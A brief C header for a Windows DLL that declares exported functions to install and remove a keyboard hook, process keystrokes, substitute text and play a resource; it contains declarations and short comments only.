#define CS_DLL_API __declspec( dllexport )

CS_DLL_API void PlayResource(LPSTR lpName);
CS_DLL_API void A();
CS_DLL_API void installhook(HWND h,char* key);//This function installs the Keyboard hook.
CS_DLL_API void removehook();//This function removes the previously installed hook.
CS_DLL_API LRESULT CALLBACK hookproc(int ncode,WPARAM wparam,LPARAM lparam);//This function is called when the keyboard is operated.
LRESULT TraitelaCle(WPARAM w, LPARAM l);//This block processes the keystroke info.
 LRESULT subst(const char *src, const char *dest);